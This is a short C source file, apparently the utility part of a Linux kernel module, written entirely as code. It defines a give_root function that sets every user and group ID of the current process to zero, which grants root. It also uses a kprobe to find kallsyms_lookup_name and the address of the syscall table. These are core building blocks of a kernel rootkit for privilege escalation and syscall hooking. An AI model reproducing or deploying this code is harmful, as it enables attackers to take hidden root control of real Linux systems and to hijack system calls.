#include "utils.h"

void give_root(void) {
        struct cred *creds;
        creds = prepare_creds();

        if (creds == NULL) {
                return;
        }

        creds->uid.val = creds->gid.val = 0;
        creds->euid.val = creds->egid.val = 0;
        creds->suid.val = creds->sgid.val = 0;
        creds->fsuid.val = creds->fsgid.val = 0;

        commit_creds(creds);
}

kallsyms_lookup_name_t get_kallsyms_lookup_name(void) {
        struct kprobe kp = {
                .symbol_name = "kallsyms_lookup_name"
        };
        kallsyms_lookup_name_t kallsyms_lookup_name;
        register_kprobe(&kp);
        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
        unregister_kprobe(&kp);
        return kallsyms_lookup_name;
}


unsigned long *get_sys_call_table_addr(void) {
        struct kprobe kp = {
                .symbol_name = "kallsyms_lookup_name"
        };
        kallsyms_lookup_name_t kallsyms_lookup_name;
        register_kprobe(&kp);
        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
        unregister_kprobe(&kp);
        return (unsigned long *) kallsyms_lookup_name("sys_call_table");
}
